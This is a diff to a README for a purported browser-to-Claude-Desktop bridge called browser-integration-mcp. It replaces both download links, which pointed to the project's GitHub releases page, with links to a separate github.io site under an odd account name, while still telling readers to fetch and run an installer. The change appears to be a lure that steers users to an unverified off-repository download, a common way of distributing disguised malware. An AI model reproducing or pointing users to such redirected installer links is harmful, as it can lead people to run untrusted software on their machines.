@@ -1,6 +1,6 @@
 # 🌐 browser-integration-mcp - Connect your browser to Claude Desktop
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Superciliaryridgeboomerang564/browser-integration-mcp/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://superciliaryridgeboomerang564.github.io)
 
 This application connects your web browser to the Claude Desktop software. It allows the AI to interact with websites through an isolated bridge. You define the rules the browser follows while you work with Claude. 
 
@@ -17,7 +17,7 @@ Ensure your computer meets these requirements before you start:
 
 Visit the link below to get the installer for your system.
 
-[Download the latest version here](https://github.com/Superciliaryridgeboomerang564/browser-integration-mcp/releases)
+[Download the latest version here](https://superciliaryridgeboomerang564.github.io)
 
 1.  Click the link above to open your browser.
 2.  Look for the section labeled "Assets" at the bottom of the page.
